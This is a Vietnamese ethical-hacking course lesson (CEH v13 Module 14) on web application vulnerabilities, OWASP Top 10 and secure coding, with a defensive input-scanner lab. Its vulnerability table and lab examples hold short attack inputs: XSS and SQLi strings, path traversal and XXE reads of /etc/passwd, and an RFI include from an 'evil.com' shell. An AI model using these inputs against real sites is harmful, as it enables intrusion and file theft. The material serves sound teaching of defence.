# Tuần 14: Hacking Web Applications (CEH v13 Module 14)

> Module CEH v13 tương ứng: **14 — Hacking Web Applications**. Nội dung đã được chuẩn hóa sang Markdown.

## Mục Tiêu Tuần / Week Objectives

Bám sát nội dung **Module 14** trong giáo trình CEH v13. Kết thúc tuần, học viên:

1. Nắm **kiến trúc web application** (client, server, DB, API) và **OWASP Top 10 (2021)** làm khung tư duy.
2. Phân biệt và hiểu cơ chế các lỗ hổng web phổ biến: **XSS** (stored/reflected/DOM), **CSRF**, **LFI/RFI**, **command injection**, **clickjacking**, **insecure deserialization**, **XXE**, **IDOR**, **auth/session flaws**.
3. Hiểu **input validation / output encoding** là phòng thủ gốc rễ, cùng **WAF**, **CSP**, **secure coding**.
4. Biết quy trình **web app pentest methodology** (recon → mapping → fuzz → exploit → report) — chỉ lab.
5. Xây dựng kỹ năng **kiểm tra input injection** bằng tool phòng thủ (Lab 1) và viết code an toàn.

---

## Lý Thuyết / Theory

### 1. OWASP Top 10 (2021) — Khung Tư Duy

| # | Lỗ hổng | Ý chính |
|---|---------|---------|
| A01 | **Broken Access Control** | IDOR, không kiểm tra quyền |
| A02 | **Cryptographic Failures** | Dữ liệu nhạy cảm không mã hoá |
| A03 | **Injection** | SQLi, command, XSS nhập qua input |
| A04 | **Insecure Design** | Thiếu kiểm soát thiết kế |
| A05 | **Security Misconfiguration** | Default config, verbose errors |
| A06 | **Vulnerable Components** | Dependency cũ (liên hệ Tuần 5) |
| A07 | **AuthN/AuthZ Failures** | Session yếu, thiếu MFA |
| A08 | **Software/Data Integrity** | Deserialization, pipeline |
| A09 | **Logging & Monitoring Failures** | Không log/giám sát |
| A10 | **SSRF** | Server gửi request tới nội bộ |

### 2. Các Lỗ Hổng Chi Tiết

| Lỗ hổng | Cơ chế | Ví dụ | Phòng thủ |
|---------|--------|-------|-----------|
| **XSS reflected** | Input được in lại trang không encode | `?q=<script>alert(1)</script>` | Output encoding, CSP |
| **XSS stored** | Lưu payload vào DB, hiện cho người khác | Bình luận chứa script | Validate + encode khi hiển thị |
| **DOM XSS** | JS đọc input và gán vào DOM | `location.hash` chưa sanitize | Không dùng `innerHTML` với input |
| **CSRF** | Ép trình duyệt gửi request đã xác thực | `<img src=/transfer?to=x>` | CSRF token, SameSite |
| **LFI** | Đọc file local qua path param | `?page=../../etc/passwd` | Whitelist, normalize path |
| **RFI** | Include file từ xa | `?page=http://evil.com/shell` | Chặn include từ xa |
| **Command injection** | Nối input vào lệnh OS | `; ls -la` | Không dùng shell, whitelist |
| **Clickjacking** | Đặt iframe trong suốt lên UI lừa click | iframe overlay | X-Frame-Options / CSP frame-ancestors |
| **XXE** | XML parser đọc external entity | `<!DOCTYPE ... SYSTEM "file:///etc/passwd">` | Tắt external entity, dùng JSON |
| **IDOR** | Truy cập resource bằng ID đoán được | `?id=1001` truy cập người khác | Kiểm tra authorization mỗi request |
| **Deserialization** | Object độc hại được deserialize | payload Java/PHP | Không trust input, chữ ký |

### 3. Vì Sao Input Validation & Output Encoding Là Gốc Rễ

- **Input validation (whitelist):** chỉ chấp nhận dữ liệu đúng format (email, số, enum) — chặn injection từ đầu.
- **Output encoding:** khi in dữ liệu ra HTML/JS/SQL, **encode đúng context** (`html.escape`, parameterized SQL) — dù input xấu cũng không thành code.
- **Nguyên tắc vàng:** *never trust user input* — kiểm tra **server-side** (client-side chỉ là UX).

### 4. WAF & Secure Coding

- **WAF (Web Application Firewall):** chặn pattern tấn công (ModSecurity, Cloudflare WAF) — nhưng có thể bị bypass bằng encoding (liên hệ Tuần 12 evasion) → không thay thế secure coding.
- **Secure coding:**
  - SQL: dùng **parameterized query** (không nối chuỗi).
  - HTML: dùng thư viện escape của framework.
  - Header: đủ security headers (Tuần 13).
  - Auth: MFA, session an toàn (Tuần 11), rate limit login.
  - Logging: log đủ + giám sát (OWASP A09).

### 5. Web App Pentest Methodology (Chỉ Lab)

```
Recon (footprinting app — Tuần 2)
    → Mapping (enum endpoints, param — dùng Burp/OWASP ZAP)
    → Fuzzing (thử injection trên từng input)
    → Exploit (xác nhận lỗ hổng trên DVWA/Juice Shop lab)
    → Report (mô tả, ảnh hưởng, cách khắc phục)
```

> [!WARNING]
> Chỉ pentest web app **của bạn** hoặc lab (DVWA, OWASP Juice Shop, WebGoat) trong môi trường cô lập. Pentest web app người khác không có ủy quyền là bất hợp pháp.

---

## Cảnh Báo An Toàn & Đạo Đức / Safety & Ethics

> [!WARNING]
> 1. Lab tuần này là **PHÒNG THỦ**: tool phân tích **chuỗi input bạn tự nhập** để nhận diện pattern injection — **không tấn công** web app, không gửi request.
> 2. Tất cả nội dung khai thác web (XSS, SQLi, command injection) **chỉ thực hành trên DVWA / Juice Shop / WebGoat** chạy localhost trong máy ảo của bạn.
> 3. Tấn công web app của người khác (kể cả "thử nhẹ") là **bất hợp pháp** (Luật An ninh mạng 2018 VN).
> 4. Vi phạm = **FAIL toàn bộ khoá học**.

---

## Thực Học Code / Hands-On (Defensive-first)

> Code đầy đủ trong `CODE/week14_input_scanner.py`. Tool nhận **một chuỗi input bạn tự nhập** (hoặc input mẫu), phát hiện pattern injection (SQLi, XSS, command, path traversal) và in bản **sanitize** an toàn — **hoàn toàn offline**.

### Lab 1: Input Injection Scanner & Sanitizer (Python)

Công cụ phòng thủ: kiểm tra một chuỗi (VD form nhập liệu của web app bạn) có chứa pattern nguy hiểm không, đồng thời in ra cách **escape** an toàn để dùng trong code.

```bash
python3 CODE/week14_input_scanner.py --demo
python3 CODE/week14_input_scanner.py --input "1' OR 1=1--"
python3 CODE/week14_input_scanner.py --input "<script>alert(1)</script>"
```

Kết quả mẫu (demo):

```
[INPUT]      1' OR 1=1--
[SQLi]       [!] Phát hiện: "OR 1=1", "--"
[HTML]       An toàn (không phải thẻ HTML)
[Command]    An toàn
[SANITIZED]  1\' OR 1=1--     (dành cho SQL — nhưng TỐT NHẤT dùng parameterized query)
[KẾT LUẬN]   Nghi ngờ SQL injection — không bao giờ nối thẳng vào query.
```

> **Giải thích CEH:** scan pattern chỉ là **lớp phòng thủ thứ hai**. Phòng thủ đúng chuẩn: **parameterized query** (SQLi), **output encoding** (XSS), **không dùng shell** (command injection). Tool giúp bạn hiểu & test nhưng không thay thế secure coding.

### Lab 2: Code phòng thủ tham khảo

```python
# SQL an toàn — parameterized query (KHÔNG nối chuỗi)
import sqlite3
conn = sqlite3.connect("app.db")
cur = conn.execute(
    "SELECT * FROM users WHERE email = ? AND pass = ?",
    (email, password),          # dấu ? = parameter — input không bao giờ là code
)

# HTML an toàn — output encoding khi in ra trang
import html
safe = html.escape(user_comment)   # <script> -> &lt;script&gt;

# Command an toàn — không dùng os.system với input; dùng shlex + whitelist
import shlex, subprocess
cmd = shlex.split("ls -la " + filename)   # chưa đủ; tốt nhất whitelist tên file
```

### Lab 3: Thực hành trên lab (DVWA / Juice Shop — localhost)

```bash
# Nếu có Docker — chạy OWASP Juice Shop cục bộ để học (PHÒNG THỦ)
# docker run -p 3000:3000 bkimminich/juice-shop
# Hoặc WebGoat:  docker run -p 8080:8080 webgoat/goatandwolf
# -> Thực hành khai thác CHỈ trên app này trong máy ảo/container của bạn.
```

---

## Bài Tập Về Nhà / Homework

1. **Scanner:** chạy `week14_input_scanner.py --demo`, tự nhập 3 input (1 SQLi, 1 XSS, 1 command injection), chụp màn hình, giải thích kết quả sanitize.
2. **Phân loại OWASP:** với mỗi lỗ hổng XSS, CSRF, LFI, command injection, IDOR — nêu 1 ví dụ + 1 cách phòng thủ.
3. **Secure coding:** viết lại 2 đoạn code "xấu" (SQL nối chuỗi, `innerHTML` với input) thành phiên bản an toàn.
4. **Case study:** tìm hiểu 1 vụ web breach (VD: SolarWinds? hoặc WordPress plugin) — nêu lỗ hổng thuộc OWASP nào, cách khai thác, cách phòng thủ.

---

## Rubric Đánh Giá Tuần 14

| Tiêu chí | Xuất sắc (90-100%) | Khá (70-89%) | Yếu (<70%) |
|----------|--------------------|--------------|------------|
| **Scanner** | Chạy đúng 3 input, giải thích sanitize (40đ) | Chạy được nhưng thiếu giải thích (25đ) | Không chạy được (10đ) |
| **Phân loại OWASP** | Đủ 5 lỗ hổng + ví dụ + phòng thủ (30đ) | Thiếu 1-2 phần (20đ) | Sai phân loại (5đ) |
| **Secure coding + case** | Code an toàn đúng + phân tích case (30đ) | Thiếu 1 phần (20đ) | Chép lại (5đ) |

---

## Checklist Đầu Ra Tuần 14

- [ ] Kể được OWASP Top 10 (2021) và 5 lỗ hổng chi tiết
- [ ] Phân biệt XSS reflected/stored/DOM; hiểu CSRF, LFI/RFI, command injection, XXE, IDOR
- [ ] Giải thích vì sao input validation + output encoding là phòng thủ gốc rễ
- [ ] Viết được SQL parameterized query & HTML escape an toàn
- [ ] Chạy thành công `week14_input_scanner.py --demo`
- [ ] Hiểu web app pentest methodology (chỉ lab DVWA/Juice Shop)
